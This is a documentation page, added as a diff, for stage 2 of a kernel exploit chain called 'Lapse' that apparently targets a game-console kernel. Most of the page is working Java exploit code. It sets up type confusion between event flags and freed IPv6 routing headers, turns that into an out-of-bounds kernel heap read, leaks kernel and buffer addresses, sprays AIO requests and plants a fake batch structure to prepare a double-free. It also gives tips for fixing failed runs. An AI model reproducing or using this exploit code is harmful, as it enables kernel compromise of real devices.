@@ -1,0 +1,522 @@
+---
+title: 'Stage 2: Kernel Address Leak'
+description: 'Type confusion and out-of-bounds read to leak kernel addresses'
+---
+
+# Stage 2: Kernel Address Leak
+
+Stage 2 exploits the aliased sockets from Stage 1 to achieve type confusion between kernel structures. By confusing an event flag (evf) with an IPv6 routing header, the exploit performs out-of-bounds reads to leak critical kernel addresses needed for subsequent stages.
+
+## Overview
+
+Implemented in `Lapse.executeStage2()` at `Lapse.java:686-923`.
+
+```java
+public static boolean executeStage2(int[] aliasedPair) {
+    Status.println("=== STAGE 2: Leak kernel addresses ===");
+    // Type confuse evf with rthdr, leak addresses, find target_id
+    return true; // on success
+}
+```
+
+## Goals of Stage 2
+
+This stage must obtain:
+
+1. **kernelAddr** - Address inside kernel's mapped ELF (for ROP/code reuse)
+2. **kbufAddr** - Address of our controlled buffer in kernel memory
+3. **reqs1Addr** - Address of a SceKernelAioRWRequest structure
+4. **targetId** - AIO ID that points to reqs1 (needed for Stage 3)
+5. **fakeReqs3Addr** - Address of our fake AIO batch structure
+
+## Step 1: Type Confusion (evf ↔ ip6_rthdr)
+
+### The Type Confusion Bug
+
+We have aliased sockets where both point to freed memory. By:
+1. Closing one aliased socket (freeing the rthdr)
+2. Allocating event flags (evf) to reclaim the memory
+3. Using the remaining aliased socket to read/write
+
+We can confuse the kernel into treating an `evf` structure as an `ip6_rthdr` structure.
+
+### Implementation
+
+From `Lapse.java:689-758`:
+
+```java
+int sd = aliasedPair[0];  // Keep this socket
+int bufLen = 0x80 * LEAK_LEN;  // LEAK_LEN = 16, so 0x800 bytes
+Buffer buf = new Buffer(bufLen);
+
+// Type confuse a struct evf with a struct ip6_rthdr
+Status.println("Confuse evf with rthdr");
+
+Buffer name = new Buffer(1);
+
+// Free one of the aliased rthdrs
+Helper.syscall(Helper.SYS_CLOSE, (long)aliasedPair[1]);
+
+evf = -1;
+
+for (int i = 1; i <= NUM_ALIAS; i++) {  // NUM_ALIAS = 100
+    int[] evfs = new int[NUM_HANDLES];  // NUM_HANDLES = 0x100 (256)
+
+    // Reclaim freed rthdr with evf objects
+    for (int j = 0; j < NUM_HANDLES; j++) {
+        int evfFlags = 0xf00 | ((j + 1) << 16);  // Unique marker in upper bits
+        evfs[j] = Helper.createEvf(name.address(), evfFlags);
+    }
+
+    // Read through the remaining aliased socket
+    Helper.getRthdr(sd, buf, 0x80);
+
+    int flag = buf.getInt(0);
+
+    // Check if we read an evf's flags
+    if ((flag & 0xf00) == 0xf00) {
+        int idx = (flag >>> 16);  // Extract marker
+        int expectedFlag = flag | 1;  // Set bit 0
+        
+        if (idx >= 1 && idx <= evfs.length) {
+            evf = evfs[idx - 1];  // Found our evf!
+
+            // Verify by writing back
+            Helper.setEvfFlags(evf, expectedFlag);
+            Helper.getRthdr(sd, buf, 0x80);
+
+            int val = buf.getInt(0);
+            if (val == expectedFlag) {
+                // Success - keep this EVF
+            } else {
+                evf = -1;  // Reset on failure
+            }
+        }
+    }
+
+    // Free all EVFs except the found one
+    for (int j = 0; j < NUM_HANDLES; j++) {
+        if (evfs[j] != evf && evfs[j] >= 0) {
+            try {
+                Helper.freeEvf(evfs[j]);
+            } catch (Exception e) {
+                // Continue if EVF free fails
+            }
+        }
+    }
+
+    if (evf != -1) {
+        Status.println("Confused rthdr and evf at attempt: " + i);
+        break;
+    }
+}
+
+if (evf == -1) {
+    throw new RuntimeException("Failed to confuse evf and rthdr");
+}
+```
+
+<Note>
+We create 256 evfs with unique markers (`0xf00 | (j+1)<<16`). When we read our marker back through the socket, we've confirmed the evf and rthdr are confused.
+</Note>
+
+## Step 2: Enlarging the Routing Header
+
+### Out-of-Bounds Read Primitive
+
+IPv6 routing headers have a length field. By modifying the evf's flags (which overlap with the rthdr's length), we can trick the kernel into reading beyond the 0x80 byte boundary.
+
+From `Lapse.java:759-768`:
+
+```java
+// Enlarge ip6_rthdr by writing to its len field by setting the evf's flag
+Helper.setEvfFlags(evf, 0xff << 8);  // Set length to maximum
+
+// Now getRthdr will read up to bufLen bytes (0x800)
+// This gives us out-of-bounds read of adjacent kernel heap memory
+```
+
+<Warning>
+This creates an **out-of-bounds read** primitive. The kernel will copy data from adjacent heap allocations into our userspace buffer.
+</Warning>
+
+## Step 3: Leaking Kernel Addresses
+
+### Reading the evf Structure
+
+From `Lapse.java:760-768`:
+
+```java
+// Read the enlarged rthdr (actually reading evf + adjacent memory)
+Helper.getRthdr(sd, buf, bufLen);  // Read 0x800 bytes
+
+// evf.cv.cv_description = "evf cv" - string is located at the kernel's mapped ELF file
+kernelAddr = buf.getLong(0x28);
+Status.println("\"evf cv\" string addr: " + Long.toHexString(kernelAddr));
+
+// evf.waiters.tqh_last == &evf.waiters.tqh_first
+kbufAddr = buf.getLong(0x40) - 0x38;
+Status.println("Kernel buffer addr: " + Long.toHexString(kbufAddr));
+```
+
+### Why These Addresses?
+
+The `evf` (event flag) kernel structure contains:
+
+```c
+struct evf {
+    // ... fields ...
+    struct cv cv;              // +0x20: Condition variable
+        // cv.cv_description → "evf cv" string in kernel .rodata
+    // ...
+    TAILQ_HEAD(, thread) waiters;  // +0x38: Wait queue
+        // waiters.tqh_last points to &waiters.tqh_first
+};
+```
+
+- **0x28**: `cv.cv_description` pointer → points to "evf cv" string in kernel `.rodata` section
+- **0x40**: `waiters.tqh_last` → points back to the evf structure itself (self-reference)
+
+<Note>
+The "evf cv" string is compiled into the kernel binary, so its address reveals the kernel's base address. The self-referencing pointer reveals where our evf (and thus kbuf) is located in kernel memory.
+</Note>
+
+## Step 4: Preparing Fake reqs3
+
+### Why Fake reqs3?
+
+In Stage 3, we need to double-free a `SceKernelAioRWRequest` (reqs1). To do this, we need to corrupt its `.ar1_batch` pointer to point to a fake batch structure that we control.
+
+From `Lapse.java:770-783`:
+
+```java
+// Prep to fake reqs3 (aio_batch)
+int wbufsz = 0x80;
+Buffer wbuf = new Buffer(wbufsz);
+int rsize = Helper.buildRoutingHeader(wbuf, wbufsz);
+int markerVal = 0xdeadbeef;
+int reqs3Offset = 0x10;
+
+wbuf.putInt(4, markerVal);  // Marker to find this structure later
+wbuf.putInt(reqs3Offset + 0, 1);  // .ar3_num_reqs
+wbuf.putInt(reqs3Offset + 4, 0);  // .ar3_reqs_left
+wbuf.putInt(reqs3Offset + 8, Helper.AIO_STATE_COMPLETE);  // .ar3_state
+wbuf.putByte(reqs3Offset + 0xc, (byte)0);  // .ar3_done
+wbuf.putInt(reqs3Offset + 0x28, 0x67b0000);  // .ar3_lock.lock_object.lo_flags
+wbuf.putLong(reqs3Offset + 0x38, 1L);  // .ar3_lock.lk_lock = LK_UNLOCKED
+```
+
+### Fake Batch Structure
+
+We're creating a minimal valid `aio_batch` structure:
+
+```
+Offset  Value            Meaning
+------  -----            -------
+0x00    1                num_reqs = 1 (batch has 1 request)
+0x04    0                reqs_left = 0 (all complete)
+0x08    AIO_STATE_COMPLETE  state = complete
+0x0c    0                done = false
+0x28    0x67b0000        lock flags (valid lock)
+0x38    1                lock state = unlocked
+```
+
+This structure will pass kernel validation checks when we manipulate reqs1.
+
+## Step 5: Leaking reqs2 (aio_entry)
+
+### Spray and Leak Strategy
+
+We spray AIO requests and routing headers simultaneously, then use our OOB read to find them.
+
+From `Lapse.java:785-850`:
+
+```java
+// Prep to leak reqs2 (aio_entry)
+int numElems = 6;
+long ucred = kbufAddr + 4;  // Fake credential pointer
+Buffer leakReqs = Helper.createAioRequests(numElems);
+leakReqs.putLong(0x10, ucred);  // .ai_cred
+
+int numLoop = NUM_SDS;  // 64
+int leakIdsLen = numLoop * numElems;  // 384 total AIOs
+Buffer leakIds = new Buffer(4 * leakIdsLen);
+int step = 4 * numElems;
+int cmd = Helper.AIO_CMD_FLAG_MULTI | Helper.AIO_CMD_WRITE;
+
+long reqs2Off = -1;
+long fakeReqs3Off = -1;
+fakeReqs3Sd = -1;
+
+for (int i = 1; i <= NUM_LEAKS; i++) {  // NUM_LEAKS = 16
+
+    // Spray reqs2 and rthdr with fake reqs3
+    for (int j = 1; j <= numLoop; j++) {
+        wbuf.putInt(8, j);  // Socket index marker
+        Helper.aioSubmitCmd(cmd, leakReqs.address(), numElems, 
+                           Helper.AIO_PRIORITY_HIGH, 
+                           leakIds.address() + ((j-1) * step));
+        Helper.setRthdr(sockets[j-1], wbuf, rsize);
+    }
+
+    // Out-of-bounds read on adjacent malloc 0x80 memory
+    Helper.getRthdr(sd, buf, bufLen);  // Read 0x800 bytes
+
+    int sdIdx = -1;
+    reqs2Off = -1;
+    fakeReqs3Off = -1;
+
+    // Search starting from 0x80, not 0 (skip our own evf)
+    for (int off = 0x80; off < bufLen; off += 0x80) {
+        // Check for reqs2 with correct command
+        if (reqs2Off == -1 && verifyReqs2(buf, off, Helper.AIO_CMD_WRITE)) {
+            reqs2Off = off;
+        }
+
+        // Check for fake reqs3
+        if (fakeReqs3Off == -1) {
+            int marker = buf.getInt(off + 4);
+            if (marker == markerVal) {  // 0xdeadbeef
+                fakeReqs3Off = off;
+                sdIdx = buf.getInt(off + 8);  // Socket index we wrote
+            }
+        }
+    }
+
+    if (reqs2Off != -1 && fakeReqs3Off != -1) {
+        Status.println("Found reqs2 and fake reqs3 at attempt: " + i);
+        if (sdIdx > 0 && sdIdx <= sockets.length) {
+            fakeReqs3Sd = sockets[sdIdx - 1];
+            break;
+        }
+    }
+
+    // Free AIOs before next attempt
+    Helper.freeAios(leakIds.address(), leakIdsLen, false);
+}
+```
+
+<Note>
+We're exploiting the fact that the kernel allocates both aio_entry and ip6_rthdr structures in the same 0x80 byte zone. Our OOB read reveals adjacent allocations.
+</Note>
+
+### Verifying reqs2 Structure
+
+From `Lapse.java:617-683`:
+
+```java
+public static boolean verifyReqs2(Buffer buf, int offset, int cmd) {
+    try {
+        // reqs2.ar2_cmd
+        int actualCmd = buf.getInt(offset);
+        if (actualCmd != cmd) {
+            return false;
+        }
+
+        // Check if offsets 0x10 to 0x20 look like kernel heap addresses
+        for (int i = 0x10; i <= 0x20; i += 8) {
+            short highWord = buf.getShort(offset + i + 6);
+            if (highWord != (short)0xffff) {  // Kernel addresses start with 0xffff
+                return false;
+            }
+        }
+
+        // Check reqs2.ar2_result.state
+        int state1 = buf.getInt(offset + 0x38);
+        int state2 = buf.getInt(offset + 0x38 + 4);
+        if (!(state1 > 0 && state1 <= 4) || state2 != 0) {
+            return false;
+        }
+
+        // reqs2.ar2_file must be NULL
+        long filePtr = buf.getLong(offset + 0x40);
+        if (filePtr != 0) {
+            return false;
+        }
+
+        return true;
+    } catch (Exception e) {
+        return false;
+    }
+}
+```
+
+<Warning>
+Validation is critical. False positives will cause kernel panics in Stage 3 when we try to manipulate invalid structures.
+</Warning>
+
+## Step 6: Extracting Critical Addresses
+
+From `Lapse.java:858-882`:
+
+```java
+Status.println("Leaked aio_entry:");
+
+// Print hex dump of leaked reqs2
+for (int i = 0; i < 0x80; i += 16) {
+    StringBuffer sb = new StringBuffer();
+    sb.append(Helper.toHexString(i, 8));
+    sb.append(": ");
+    for (int j = 0; j < 16 && (i + j) < 0x80; j++) {
+        int byteVal = buf.getByte((int)reqs2Off + i + j) & 0xff;
+        sb.append(Helper.toHexString(byteVal, 2));
+        sb.append(" ");
+    }
+    Status.println(sb.toString());
+}
+
+aioInfoAddr = buf.getLong((int)reqs2Off + 0x18);
+
+reqs1Addr = buf.getLong((int)reqs2Off + 0x10);
+reqs1Addr = reqs1Addr & (~0xffL);  // Mask off lower byte (list pointer fixup)
+
+fakeReqs3Addr = kbufAddr + fakeReqs3Off + reqs3Offset;
+
+Status.println("reqs1_addr = " + Long.toHexString(reqs1Addr));
+Status.println("fake_reqs3_addr = " + Long.toHexString(fakeReqs3Addr));
+```
+
+### Address Extraction
+
+```
+aio_entry (reqs2) structure:
++0x00: ar2_cmd
++0x10: ar2_next → points to reqs1 (SceKernelAioRWRequest)
++0x18: ar2_info → points to aio_info
++0x20: ar2_batch
+```
+
+- **reqs1Addr**: We mask off the lower byte because it's part of a linked list (LIST_ENTRY macro adds offset)
+- **aioInfoAddr**: Direct pointer, no masking needed
+- **fakeReqs3Addr**: Calculated from kbufAddr + offset into our spray
+
+## Step 7: Finding target_id
+
+### Why target_id?
+
+In Stage 3, we need to double-free reqs1. To do that, we need its AIO ID. We find it by canceling our leaked AIOs one batch at a time and checking which one changes reqs2's state.
+
+From `Lapse.java:884-916`:
+
+```java
+Status.println("Searching target_id");
+
+targetId = -1;
+long toCancel = -1;
+int toCancelLen = -1;
+
+for (int i = 0; i < leakIdsLen; i += numElems) {
+    // Cancel one batch
+    Helper.aioMultiCancel(leakIds.address() + i*4, numElems, 
+                         Helper.AIO_ERRORS.address());
+    
+    // Re-read reqs2 via OOB read
+    Helper.getRthdr(sd, buf, bufLen);
+
+    // Check if state changed to ABORTED
+    int state = buf.getInt((int)reqs2Off + 0x38);
+    if (state == Helper.AIO_STATE_ABORTED) {
+        // Found it! This batch's first request is the target
+        targetId = leakIds.getInt(i*4);
+        leakIds.putInt(i*4, 0);  // Clear it so we don't delete it
+
+        Status.println("Found target_id=" + Integer.toHexString(targetId) +
+        ", i=" + i + ", batch=" + (i / numElems));
+
+        // Cancel remaining AIOs
+        int start = i + numElems;
+        toCancel = leakIds.address() + start*4;
+        toCancelLen = leakIdsLen - start;
+
+        break;
+    }
+}
+
+if (targetId == -1) {
+    throw new RuntimeException("Target id not found");
+}
+
+Helper.cancelAios(toCancel, toCancelLen);
+Helper.freeAios(leakIds.address(), leakIdsLen, false);
+
+return true;
+```
+
+<Note>
+When we cancel the batch containing reqs1's AIO, reqs2 (which is linked to reqs1) transitions to ABORTED state. This tells us which AIO ID corresponds to reqs1.
+</Note>
+
+## Memory State After Stage 2
+
+```
+Kernel Memory Layout:
+┌────────────────────────────────────┐
+│ kernelAddr (0xffff8......)         │ → Kernel .rodata ("evf cv" string)
+│ kbufAddr   (0xffff8......)         │ → Our evf/rthdr buffer location
+│ reqs1Addr  (0xffff8......)         │ → SceKernelAioRWRequest to corrupt
+│ aioInfoAddr (0xffff8......)        │ → aio_info structure
+│ fakeReqs3Addr (0xffff8......)      │ → Our fake aio_batch in rthdr
+│ targetId (0x.......)               │ → AIO ID for reqs1
+└────────────────────────────────────┘
+
+Type Confusion:
+┌─────────────────┐
+│ Socket sd       │
+│ ↓               │
+│ evf structure   │ ← Treated as ip6_rthdr by socket
+│ (0x80 bytes)    │ ← Treated as evf by kernel APIs
+│                 │
+│ Enlarged len    │ → Causes OOB read
+└─────────────────┘
+```
+
+## Success Criteria
+
+✅ Stage 2 succeeds when:
+1. Type confusion established (evf ↔ rthdr)
+2. kernelAddr leaked (high word = 0xffff, points to kernel text)
+3. kbufAddr leaked (high word = 0xffff, self-reference valid)
+4. reqs2 found and validated via verifyReqs2()
+5. Fake reqs3 structure found in spray (marker = 0xdeadbeef)
+6. reqs1Addr extracted from reqs2
+7. targetId found via cancel state change
+
+## Common Failure Points
+
+### Failed to Confuse evf and rthdr
+
+```
+Failed to confuse evf and rthdr
+```
+
+**Cause**: Memory reclaimed by something other than evf  
+**Solution**: Increase NUM_HANDLES or retry exploit
+
+### Could Not Leak reqs2 and fake reqs3
+
+```
+Could not leak reqs2 and fake reqs3
+```
+
+**Cause**: OOB read not reaching our sprayed structures  
+**Solution**: Increase LEAK_LEN or NUM_LEAKS
+
+### Target ID Not Found
+
+```
+Target id not found
+```
+
+**Cause**: reqs2 not properly linked to our AIOs  
+**Solution**: Verify reqs2 validation logic, may indicate system instability
+
+## Next Stage
+
+With kernel addresses leaked:
+
+→ [Stage 3: reqs1 Double-Free](/technical/stage-3-reqs1-double-free) - Second memory corruption using leaked addresses
+
+## Related Code
+
+- `Lapse.executeStage2()` - Main stage function (`Lapse.java:686`)
+- `Lapse.verifyReqs2()` - Structure validation (`Lapse.java:617`)
